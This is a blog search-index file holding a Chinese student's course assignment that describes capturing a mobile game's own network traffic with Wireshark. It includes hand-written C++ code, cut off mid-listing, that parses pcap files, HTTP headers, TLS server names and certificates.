@@ -1,0 +1,983 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>C++流量包分析——王者荣耀APP&amp;Line App</title>
+    <url>/2021/04/13/C++%E6%B5%81%E9%87%8F%E5%8C%85%E5%88%86%E6%9E%90%E2%80%94%E2%80%94%E7%8E%8B%E8%80%85%E8%8D%A3%E8%80%80APP&amp;Line%20App/</url>
+    <content><![CDATA[<h2 id="网络行为学导论作业"><a href="#网络行为学导论作业" class="headerlink" title="网络行为学导论作业"></a>网络行为学导论作业</h2><h3 id="“王者荣耀”流量数据包分析"><a href="#“王者荣耀”流量数据包分析" class="headerlink" title="“王者荣耀”流量数据包分析"></a>“王者荣耀”流量数据包分析</h3><p>编码环境：gcc 9.3.0</p>
+<p>采集工具：Wireshark、手机型号RedMi K30 5G</p>
+<p>编辑工具：Sublime Text</p>
+<h4 id="数据包收集过程"><a href="#数据包收集过程" class="headerlink" title="数据包收集过程"></a>数据包收集过程</h4><p>手机开启黑域，确保活跃应用仅为“王者荣耀”，连接上电脑开启的热点。在wireshark捕获设置中找到地址为手机IP地址的网络接口，进行过滤捕获。</p>
+<p><img src="/%5Cimages%5Cimage-20210410171446726.png"></p>
+<p>打开王者荣耀APP应用，记录登入过程和部分新手教程内容流量，导出时选择pcap格式，即可得到需要分析的Pcap数据包。</p>
+<p>在wireshark中观察，数据包采用tls协议传输数据的情形较多，也有部分采用http协议传输，根据要求编写获取明文协议和密文协议相关字段的代码。</p>
+<h4 id="代码编写"><a href="#代码编写" class="headerlink" title="代码编写"></a>代码编写</h4><p>代码使用C语言linux库函数编写，流量部分除了证书获取部分调用了openssl函数库（手写代码量过大），其余部分完全根据协议结构编写代码，未采用libpcap等能直接获取相关信息的函数。</p>
+<img src="\images\image-20210410171518326.png" alt="image-20210410171518326" style="zoom: 67%;" />
+
+<p>采用了_<em>attribute</em>_((packed))进行编译优化，解决结构体读取字节时强制对齐的问题。</p>
+<img src="\images\image-20210410171731340.png" alt="image-20210410171731340" style="zoom:67%;" />
+
+<p>利用nthos函数解决读取字节时大小端的问题。</p>
+<img src="\images\image-20210410171846850.png" alt="image-20210410171846850" style="zoom:67%;" />
+
+<p>通过手工重组连续的TCP报文，根据证书数据所在的位置重组伪分片的证书内容（非连续包要通过记录ack number来回跳转指针，工作量较大）。</p>
+<p><img src="/%5Cimages%5Cimage-20210410172051699.png"></p>
+<p>将TLS中的多个DER编码的证书存储到tmp.der文件中，调用openssl库API进行证书解析。</p>
+<p><img src="/%5Cimages%5Cimage-20210410172402575.png"></p>
+<p>完整代码如下：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/bio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/x509.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE 10240</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STRSIZE 1024</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int32_t</span> bpf_int32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">u_int32_t</span> bpf_u_int32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">u_int16_t</span> u_short;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">u_int32_t</span> u_int32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">u_int64_t</span> u_int64;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">u_int16_t</span> u_int16;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">u_int8_t</span> u_int8;</span><br><span class="line"></span><br><span class="line"><span class="comment">//时间戳</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">time_val</span>&#123;</span><br><span class="line">    <span class="type">int</span> tv_sec;         <span class="comment">/* seconds 含义同 time_t 对象的值 */</span></span><br><span class="line">    <span class="type">int</span> tv_usec;        <span class="comment">/* and microseconds */</span></span><br><span class="line">&#125;time_val;</span><br><span class="line"></span><br><span class="line"><span class="comment">//pacp文件头结构体</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">pcap_file_header</span>&#123;</span><br><span class="line">    bpf_u_int32 magic;       <span class="comment">/* 0xa1b2c3d4 */</span></span><br><span class="line">    u_short version_major;   <span class="comment">/* magjor Version 2 */</span></span><br><span class="line">    u_short version_minor;   <span class="comment">/* magjor Version 4 */</span></span><br><span class="line">    bpf_int32 thiszone;      <span class="comment">/* gmt to local correction */</span></span><br><span class="line">    bpf_u_int32 sigfigs;     <span class="comment">/* accuracy of timestamps */</span></span><br><span class="line">    bpf_u_int32 snaplen;     <span class="comment">/* max length saved portion of each pkt */</span></span><br><span class="line">    bpf_u_int32 linktype;    <span class="comment">/* data link type (LINKTYPE_*) */</span></span><br><span class="line">&#125;pcap_file_header;</span><br><span class="line"></span><br><span class="line"><span class="comment">//pcap数据包头结构体</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">pcap_pkt_header</span>&#123;</span><br><span class="line">    time_val ts;  <span class="comment">//时间戳  </span></span><br><span class="line">    bpf_u_int32 caplen; <span class="comment">//当前部分的包长度  </span></span><br><span class="line">    bpf_u_int32 len;    <span class="comment">//离线包长度 </span></span><br><span class="line">&#125;pcap_pkt_header;</span><br><span class="line"></span><br><span class="line"><span class="comment">//数据帧头</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">FrameHeader</span>&#123;</span><br><span class="line">    u_int8 DstMAC[<span class="number">6</span>]; <span class="comment">//目的MAC地址</span></span><br><span class="line">    u_int8 SrcMAC[<span class="number">6</span>]; <span class="comment">//源MAC地址</span></span><br><span class="line">    u_short FrameType;    <span class="comment">//帧类型</span></span><br><span class="line">&#125;FrameHeader;</span><br><span class="line"></span><br><span class="line"><span class="comment">//IP数据报头</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">IPHeader</span>&#123;</span><br><span class="line">    u_int8 Ver_HLen;       <span class="comment">//版本+报头长度</span></span><br><span class="line">    u_int8 TOS;            <span class="comment">//服务类型</span></span><br><span class="line">    u_int16 TotalLen;       <span class="comment">//总长度</span></span><br><span class="line">    u_int16 ID; <span class="comment">//标识</span></span><br><span class="line">    u_int16 Flag_Segment;   <span class="comment">//标志+片偏移</span></span><br><span class="line">    u_int8 TTL;            <span class="comment">//生存周期</span></span><br><span class="line">    u_int8 Protocol;       <span class="comment">//协议类型</span></span><br><span class="line">    u_int16 Checksum;       <span class="comment">//头部校验和</span></span><br><span class="line">    u_int32 SrcIP; <span class="comment">//源IP地址</span></span><br><span class="line">    u_int32 DstIP; <span class="comment">//目的IP地址</span></span><br><span class="line">&#125;IPHeader;</span><br><span class="line"></span><br><span class="line"><span class="comment">//TCP数据报头</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">TCPHeader</span>&#123;</span><br><span class="line">    u_int16 SrcPort;<span class="comment">//源端口</span></span><br><span class="line">    u_int16 DstPort;<span class="comment">//目的端口</span></span><br><span class="line">    u_int32 SeqNO;<span class="comment">//序号</span></span><br><span class="line">    u_int32 AckNO; <span class="comment">//确认号</span></span><br><span class="line">    u_int8 HeaderLen; <span class="comment">//数据报头的长度(4 bit) + 保留(4 bit)</span></span><br><span class="line">    u_int8 Flags; <span class="comment">//标识TCP不同的控制消息</span></span><br><span class="line">    u_int16 Window; <span class="comment">//窗口大小</span></span><br><span class="line">    u_int16 Checksum; <span class="comment">//校验和</span></span><br><span class="line">    u_int16 UrgentPointer;  <span class="comment">//紧急指针</span></span><br><span class="line">&#125;TCPHeader;</span><br><span class="line"></span><br><span class="line"><span class="comment">//UDP数据</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">UDPHeader</span>&#123;</span><br><span class="line">    u_int16 SrcPort;     <span class="comment">// 源端口号16bit</span></span><br><span class="line">    u_int16 DstPort;    <span class="comment">// 目的端口号16bit</span></span><br><span class="line">    u_int16 len;        <span class="comment">// 数据包长度16bit</span></span><br><span class="line">    u_int16 checkSum;   <span class="comment">// 校验和16bit</span></span><br><span class="line">&#125;UDPHeader;</span><br><span class="line"></span><br><span class="line"><span class="comment">//TLS数据</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">TLSheader</span>&#123;</span><br><span class="line">    u_int8 ContentType; <span class="comment">//记录类型</span></span><br><span class="line">    u_int16 Version; </span><br><span class="line">    u_int16 Length;</span><br><span class="line">&#125;__attribute__((packed)) TLSheader;<span class="comment">//编译优化解决强制对齐</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//函数声明</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">GetStringByHeadAndTail</span><span class="params">(FILE *fp,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">char</span> *head_str,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">char</span> *tail_str,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">char</span> *buf,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">int</span> len)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">GetHeader</span><span class="params">(FILE *fp,</span></span></span><br><span class="line"><span class="params"><span class="function">    pcap_file_header *file_header,</span></span></span><br><span class="line"><span class="params"><span class="function">    pcap_pkt_header *pkt_header,</span></span></span><br><span class="line"><span class="params"><span class="function">    FrameHeader *eth_header,</span></span></span><br><span class="line"><span class="params"><span class="function">    IPHeader *ip_header,</span></span></span><br><span class="line"><span class="params"><span class="function">    TCPHeader *tcp_header,</span></span></span><br><span class="line"><span class="params"><span class="function">    UDPHeader *udp_header)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">GetCertificateByReassembledTCP</span><span class="params">(FILE *fp,</span></span></span><br><span class="line"><span class="params"><span class="function">    u_int8 *buf,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">int</span> next_pkt_offset,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">int</span> tol_certificate_len,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">int</span> ack_value)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ParseDerCertificate</span><span class="params">(FILE * fp,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">int</span> certificate_len)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//流量结构体指针初始化</span></span><br><span class="line">pcap_file_header *file_header = <span class="literal">NULL</span>;</span><br><span class="line">pcap_pkt_header *pkt_header = <span class="literal">NULL</span>;</span><br><span class="line">FrameHeader *eth_header = <span class="literal">NULL</span>;</span><br><span class="line">IPHeader *ip_header = <span class="literal">NULL</span>;</span><br><span class="line">TCPHeader *tcp_header = <span class="literal">NULL</span>;</span><br><span class="line">UDPHeader *udp_header = <span class="literal">NULL</span>;</span><br><span class="line">TLSheader *tls_header = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>** argv)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    相关变量初始化</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//流量结构体指针申请空间</span></span><br><span class="line">    file_header = (pcap_file_header *)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(pcap_file_header));</span><br><span class="line">    pkt_header  = (pcap_pkt_header *)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(pcap_pkt_header));</span><br><span class="line">    eth_header = (FrameHeader *)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(FrameHeader));</span><br><span class="line">    ip_header = (IPHeader *)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(IPHeader));</span><br><span class="line">    tcp_header = (TCPHeader *)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(TCPHeader));</span><br><span class="line">    tls_header = (TLSheader *)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(TLSheader));</span><br><span class="line">    <span class="comment">//要求相关变量初始化(作业要求2/3)</span></span><br><span class="line">    <span class="type">int</span> src_port,dst_port;</span><br><span class="line">    <span class="type">int</span> ip_protocol,tcp_flags;</span><br><span class="line">    <span class="type">int</span> ip_len,http_len;<span class="comment">//HTTP</span></span><br><span class="line">    <span class="type">int</span> tls_type,tls_version,tls_length;</span><br><span class="line">    <span class="type">int</span> cur_offset;</span><br><span class="line">    <span class="type">int</span> hello_len,hello_ciphersuites_len,hello_ciphersuites;</span><br><span class="line">    <span class="type">int</span> hello_extensions_len,hello_extension_type,hello_extension_len,hello_severname_len;</span><br><span class="line">    <span class="type">int</span> tol_certificate_len,certificate_len;<span class="comment">//SSL</span></span><br><span class="line">    <span class="type">int</span> certificate_id_list[<span class="number">20</span>] = &#123;<span class="number">72</span>,<span class="number">100</span>,<span class="number">227</span>,<span class="number">339</span>,<span class="number">553</span>,<span class="number">763</span>,<span class="number">1086</span>,<span class="number">1256</span>,<span class="number">1267</span>,<span class="number">1427</span>,<span class="number">1474</span>,<span class="number">1518</span>,<span class="number">1530</span>,<span class="number">1688</span>,<span class="number">1713</span>,<span class="number">1735</span>,<span class="number">1976</span>,<span class="number">2299</span>,<span class="number">2311</span>&#125;;</span><br><span class="line">    u_int8 buf[BUFSIZE]; </span><br><span class="line">    <span class="type">char</span> src_ip[STRSIZE],dst_ip[STRSIZE];</span><br><span class="line">    <span class="type">char</span> user_agent[STRSIZE],host[STRSIZE],content_type[STRSIZE];<span class="comment">//HTTP</span></span><br><span class="line">    <span class="type">char</span> server_name[STRSIZE];<span class="comment">//SSL</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//其他辅助变量初始化</span></span><br><span class="line">    FILE *fp = <span class="literal">NULL</span>; <span class="comment">//文件指针</span></span><br><span class="line">    FILE *fder = <span class="literal">NULL</span>, *fparse = <span class="literal">NULL</span>;<span class="comment">//证书指针</span></span><br><span class="line">    u_int64 pkt_offset; <span class="comment">//指针偏移量</span></span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>; <span class="comment">//包计数，</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    命令行参数设置</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//使用说明</span></span><br><span class="line">    <span class="keyword">if</span>(argc != <span class="number">2</span>)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;[!] Note:./main pcap_file_name.pcap&quot;</span>&lt;&lt;endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//文件可读</span></span><br><span class="line">    <span class="keyword">if</span>((fp = <span class="built_in">fopen</span>(argv[<span class="number">1</span>],<span class="string">&quot;r&quot;</span>)) == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;[!] Error: Can&#x27;t Open Pcap File!&quot;</span>&lt;&lt;endl;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    读取流量数据包</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//pcap文件头结构 24个字节</span></span><br><span class="line">    pkt_offset = <span class="number">24</span>;</span><br><span class="line">    <span class="comment">//除去文件头结构 遍历流量数据包</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">fseek</span>(fp,pkt_offset,SEEK_SET) == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">//获取各个协议头内容</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">GetHeader</span>(fp,file_header,pkt_header,eth_header,ip_header,tcp_header,udp_header)) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(buf,<span class="number">0</span>,BUFSIZE);</span><br><span class="line">        <span class="comment">//数据包计数更新</span></span><br><span class="line">        i++;</span><br><span class="line">        <span class="comment">//包偏移量更新</span></span><br><span class="line">        pkt_offset += <span class="number">16</span> + pkt_header-&gt;caplen;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        获取src_ip&amp;dst_ip</span></span><br><span class="line"><span class="comment">        获取src_port&amp;dst_port</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="built_in">inet_ntop</span>(AF_INET, (<span class="type">void</span> *)&amp;(ip_header-&gt;SrcIP), src_ip, <span class="number">16</span>);</span><br><span class="line">        <span class="built_in">inet_ntop</span>(AF_INET, (<span class="type">void</span> *)&amp;(ip_header-&gt;DstIP), dst_ip, <span class="number">16</span>);</span><br><span class="line">        src_port = <span class="built_in">ntohs</span>(tcp_header-&gt;SrcPort);</span><br><span class="line">        dst_port = <span class="built_in">ntohs</span>(tcp_header-&gt;DstPort);</span><br><span class="line">        <span class="comment">//输出ip:port信息</span></span><br><span class="line">        <span class="comment">//printf(&quot;%d:src:%s:%d ==&gt; dst:%s:%d\n&quot;,i,src_ip,src_port,dst_ip,dst_port);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        获取user_agent&amp;host&amp;content_type</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="comment">//TCP协议</span></span><br><span class="line">        ip_protocol = ip_header-&gt;Protocol;</span><br><span class="line">        <span class="keyword">if</span> (ip_protocol == <span class="number">0x06</span>)&#123;</span><br><span class="line">            tcp_flags = tcp_header-&gt;Flags;</span><br><span class="line">            ip_len = ip_header-&gt;TotalLen;</span><br><span class="line">            <span class="comment">//TCP握手之后</span></span><br><span class="line">            <span class="keyword">if</span>(tcp_flags == <span class="number">0x18</span> &amp;&amp; dst_port == <span class="number">80</span>)&#123;</span><br><span class="line">                <span class="comment">//报文长度</span></span><br><span class="line">                <span class="type">int</span> len = pkt_header-&gt;caplen - <span class="number">54</span>;</span><br><span class="line">                <span class="comment">//重置</span></span><br><span class="line">                <span class="built_in">memset</span>(user_agent,<span class="number">0</span>,<span class="built_in">sizeof</span>(user_agent));</span><br><span class="line">                <span class="built_in">memset</span>(host,<span class="number">0</span>,<span class="built_in">sizeof</span>(host));</span><br><span class="line">                <span class="built_in">memset</span>(content_type,<span class="number">0</span>,<span class="built_in">sizeof</span>(content_type));</span><br><span class="line">                <span class="comment">//查找相关值</span></span><br><span class="line">                <span class="built_in">GetStringByHeadAndTail</span>(fp,<span class="string">&quot;User-Agent:&quot;</span>,<span class="string">&quot;\r\n&quot;</span>,user_agent,len);</span><br><span class="line">                <span class="built_in">GetStringByHeadAndTail</span>(fp,<span class="string">&quot;Host:&quot;</span>,<span class="string">&quot;\r\n&quot;</span>,host,len);</span><br><span class="line">                <span class="built_in">GetStringByHeadAndTail</span>(fp,<span class="string">&quot;Content-Type:&quot;</span>,<span class="string">&quot;\r\n&quot;</span>,content_type,len);</span><br><span class="line">                <span class="comment">// printf(&quot;%d:user_agent:%s\n&quot;,i,user_agent);</span></span><br><span class="line">                <span class="comment">// printf(&quot;%d:Host:%s\n&quot;,i,user_agent);</span></span><br><span class="line">                <span class="comment">// printf(&quot;%d:Content-Type:%s\n&quot;,i,content_type);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        获取cipher_suites_value&amp;server_name</span></span><br><span class="line"><span class="comment">        获取issuer_id&amp;issuer_string</span></span><br><span class="line"><span class="comment">        获取subject_id&amp;subject_string</span></span><br><span class="line"><span class="comment">        获取validity</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取tls变量</span></span><br><span class="line">        <span class="comment">//https://www.jianshu.com/p/7e9e5e084dfb</span></span><br><span class="line">        <span class="built_in">memset</span>(tls_header,<span class="number">0</span>,<span class="built_in">sizeof</span>(TLSheader));</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">fread</span>(tls_header,<span class="built_in">sizeof</span>(TLSheader),<span class="number">1</span>,fp) != <span class="number">1</span>) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//tls header赋值</span></span><br><span class="line">        tls_type = tls_header-&gt;ContentType;</span><br><span class="line">        tls_version = <span class="built_in">ntohs</span>(tls_header-&gt;Version);<span class="comment">//解决大小端问题</span></span><br><span class="line">        tls_length =  <span class="built_in">ntohs</span>(tls_header-&gt;Length);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(tls_type == <span class="number">0x16</span> &amp;&amp; dst_port == <span class="number">443</span>)&#123;</span><br><span class="line">            u_int8 handshake_type = <span class="built_in">fgetc</span>(fp);</span><br><span class="line">            <span class="keyword">if</span>(handshake_type == <span class="number">0x01</span>)&#123;<span class="comment">//client hello</span></span><br><span class="line">                hello_len = (<span class="built_in">fgetc</span>(fp) &lt;&lt; <span class="number">16</span>) | (<span class="built_in">fgetc</span>(fp) &lt;&lt; <span class="number">8</span>) | (<span class="built_in">fgetc</span>(fp));</span><br><span class="line">                <span class="comment">//跳过hello_version&amp;random时间戳和内容</span></span><br><span class="line">                <span class="built_in">fseek</span>(fp,<span class="number">34</span>,SEEK_CUR);</span><br><span class="line">                <span class="comment">//跳过hello_session</span></span><br><span class="line">                <span class="built_in">fseek</span>(fp,<span class="built_in">fgetc</span>(fp),SEEK_CUR);</span><br><span class="line">                <span class="comment">//获取hello_ciphersuites个数</span></span><br><span class="line">                hello_ciphersuites_len = (<span class="built_in">fgetc</span>(fp) &lt;&lt; <span class="number">8</span>) | (<span class="built_in">fgetc</span>(fp));</span><br><span class="line">                <span class="comment">//输出hello_ciphersuites内容</span></span><br><span class="line">                <span class="keyword">if</span> (hello_ciphersuites_len != <span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="comment">//printf(&quot;%d:CipherSuites:&quot;,i);</span></span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i&lt;hello_ciphersuites_len/<span class="number">2</span> ; i++)&#123;</span><br><span class="line">                        hello_ciphersuites = (<span class="built_in">fgetc</span>(fp) &lt;&lt; <span class="number">8</span>) | (<span class="built_in">fgetc</span>(fp));</span><br><span class="line">                        <span class="comment">//printf(&quot;%04x&quot;,hello_ciphersuites);</span></span><br><span class="line">                        <span class="comment">//if(i != hello_ciphersuites_len/2 - 1) printf(&quot;,&quot;);</span></span><br><span class="line">                        <span class="comment">//else printf(&quot;\n&quot;);</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//跳过hello_compressionmethod</span></span><br><span class="line">                <span class="built_in">fseek</span>(fp,<span class="built_in">fgetc</span>(fp),SEEK_CUR);</span><br><span class="line">                <span class="comment">//获取hello_extensions_type&amp;hello_extensions_len</span></span><br><span class="line">                hello_extensions_len = (<span class="built_in">fgetc</span>(fp) &lt;&lt; <span class="number">8</span>) | (<span class="built_in">fgetc</span>(fp));</span><br><span class="line">                <span class="comment">//记录当前指针位置</span></span><br><span class="line">                cur_offset = <span class="built_in">ftell</span>(fp);</span><br><span class="line">                <span class="keyword">while</span>(<span class="built_in">ftell</span>(fp) - cur_offset &lt; hello_extensions_len)&#123;</span><br><span class="line">                    hello_extension_type = (<span class="built_in">fgetc</span>(fp) &lt;&lt; <span class="number">8</span>) | (<span class="built_in">fgetc</span>(fp));</span><br><span class="line">                    hello_extension_len = (<span class="built_in">fgetc</span>(fp) &lt;&lt; <span class="number">8</span>) | (<span class="built_in">fgetc</span>(fp));</span><br><span class="line">                    <span class="keyword">if</span>(hello_extension_type == <span class="number">0</span>)&#123;</span><br><span class="line">                        <span class="built_in">fseek</span>(fp,<span class="number">3</span>,SEEK_CUR);<span class="comment">//跳过List和Type</span></span><br><span class="line">                        hello_severname_len = (<span class="built_in">fgetc</span>(fp) &lt;&lt; <span class="number">8</span>) | (<span class="built_in">fgetc</span>(fp));</span><br><span class="line">                        <span class="built_in">fread</span>(server_name,hello_severname_len,<span class="number">1</span>,fp);</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;%d:SeverName:%s\n&quot;</span>,i,server_name);</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="built_in">fseek</span>(fp,hello_extension_len,SEEK_CUR);  </span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(tls_type == <span class="number">0x16</span> &amp;&amp; src_port == <span class="number">443</span>)&#123;</span><br><span class="line">            <span class="type">int</span> pkt_in_id_list = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">20</span>;k++)</span><br><span class="line">                <span class="keyword">if</span>(i == certificate_id_list[k])</span><br><span class="line">                    pkt_in_id_list = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (pkt_in_id_list != <span class="number">1</span>) <span class="keyword">continue</span>;</span><br><span class="line">            u_int8 handshake_type = <span class="built_in">fgetc</span>(fp);</span><br><span class="line">            <span class="keyword">if</span>(handshake_type == <span class="number">0x02</span>)&#123;<span class="comment">//server hello</span></span><br><span class="line">                hello_len = (<span class="built_in">fgetc</span>(fp) &lt;&lt; <span class="number">16</span>) | (<span class="built_in">fgetc</span>(fp) &lt;&lt; <span class="number">8</span>) | (<span class="built_in">fgetc</span>(fp));</span><br><span class="line">                <span class="built_in">fseek</span>(fp,hello_len,SEEK_CUR);</span><br><span class="line">                <span class="comment">//存储当前指针位置</span></span><br><span class="line">                cur_offset = <span class="built_in">ftell</span>(fp);</span><br><span class="line">                <span class="comment">//判断是否还是0x16开头的TLS协议</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">fgetc</span>(fp) == <span class="number">0x16</span>)&#123;</span><br><span class="line">                    <span class="comment">//返回前一个指针</span></span><br><span class="line">                    <span class="built_in">fseek</span>(fp,cur_offset,SEEK_SET);</span><br><span class="line">                    <span class="comment">//读取TLS header</span></span><br><span class="line">                    <span class="keyword">if</span>(<span class="built_in">fread</span>(tls_header,<span class="built_in">sizeof</span>(TLSheader),<span class="number">1</span>,fp) != <span class="number">1</span>) <span class="keyword">break</span>;</span><br><span class="line">                    <span class="comment">//判断是否是certificate</span></span><br><span class="line">                    <span class="keyword">if</span>(<span class="built_in">fgetc</span>(fp) == <span class="number">0x0b</span>)&#123;</span><br><span class="line">                        <span class="comment">//跳过handshake_len</span></span><br><span class="line">                        <span class="built_in">fseek</span>(fp,<span class="number">3</span>,SEEK_CUR);</span><br><span class="line">                        <span class="comment">//读取certificate_len</span></span><br><span class="line">                        tol_certificate_len = (<span class="built_in">fgetc</span>(fp) &lt;&lt; <span class="number">16</span>) | (<span class="built_in">fgetc</span>(fp) &lt;&lt; <span class="number">8</span>) | (<span class="built_in">fgetc</span>(fp));</span><br><span class="line">                        <span class="comment">//将所有证书内容存储到buf中，包含长度</span></span><br><span class="line">                        <span class="built_in">GetCertificateByReassembledTCP</span>(fp,buf,pkt_offset,tol_certificate_len,tcp_header-&gt;AckNO);</span><br><span class="line">                        <span class="type">int</span> certificate_buf_len = <span class="number">0</span>;</span><br><span class="line">                        <span class="keyword">while</span>(certificate_buf_len &lt; tol_certificate_len)&#123;</span><br><span class="line">                            <span class="comment">//获取buf中证书长度</span></span><br><span class="line">                            certificate_len = (buf[certificate_buf_len + <span class="number">0</span>] &lt;&lt; <span class="number">16</span>) | (buf[certificate_buf_len + <span class="number">1</span>] &lt;&lt; <span class="number">8</span>) | (buf[certificate_buf_len + <span class="number">2</span>]);</span><br><span class="line">                            certificate_buf_len += <span class="number">3</span>;</span><br><span class="line">                            <span class="comment">//存储证书(只开一个临时文件)</span></span><br><span class="line">                            fder = <span class="built_in">fopen</span>(<span class="string">&quot;tmp.der&quot;</span>,<span class="string">&quot;wb+&quot;</span>);</span><br><span class="line">                            <span class="comment">// 提取到DER文件中</span></span><br><span class="line">                            <span class="keyword">for</span>(<span class="type">int</span> i = certificate_buf_len;i &lt; certificate_buf_len + certificate_len; i++)</span><br><span class="line">                                <span class="built_in">fwrite</span>(&amp;buf[i],<span class="built_in">sizeof</span>(u_int8),<span class="number">1</span>,fder);</span><br><span class="line">                            certificate_buf_len += certificate_len;</span><br><span class="line">                            <span 